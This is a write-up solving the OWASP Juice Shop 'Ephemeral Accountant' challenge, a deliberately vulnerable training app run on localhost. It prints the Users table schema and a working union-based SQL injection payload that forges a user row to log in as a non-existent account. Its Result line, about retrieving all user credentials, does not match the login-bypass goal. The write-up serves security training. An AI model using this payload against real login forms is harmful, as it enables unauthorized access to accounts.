# Ephemeral Accountant - OWASP JUICE SHOP

## Challenge Description

* **Category**: Injection
* **Difficulty**: ⭐⭐⭐⭐
* **Description**: Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.
* **Link Resource**: `http://localhost:3000/#/score-board?categories=Injection`

## Solution

### Step 1 : Detect the Queries

* Since we finished `User Credentials` challenge before, we already know the queries to make a user

```sql
CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)
```

### Step 2 : Use the payload

* With that knowledge in mind, we can use a `UNION` query to login with the non registered account. We will inject it to the query so that the `acc0unt4nt@juice-sh.op` act like a valid account in the database.

```
' UNION SELECT 45 as id, 'acnt' as username, 'acc0unt4nt@juice-sh.op' as email, '1234' as password, 'customer' as role, '' as deluxeToken, '1.1.1.1' as lastLoginIp, 'default.svg' as profileImage, '' as totpSecret, 1 as isActive, '2024-08-30 14:32:12.456' as createdAt, '2025-09-04 14:32:12.456' as updatedAt, null as deletedAt--' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL;
```

![finduser](../../assets/ephemeral%20accountant1.png)

## Result

We are able to retrieve a list of all user credentials

![Result](../../assets/ephemeral%20accountant2.png)

## Explanation

The technique used here is a **Union-based SQL Injection** that fabricates a fake user record on the fly during query execution. This tricks the application into treating the injected row as if it were a legitimate account, allowing login without prior registration. The vulnerability arises from unsanitized input being directly concatenated into the authentication query, combined with the fact that the application accepts the unioned result as valid user data. This demonstrates how SQL Injection can not only exfiltrate information but also simulate non-existent entities for unauthorized access.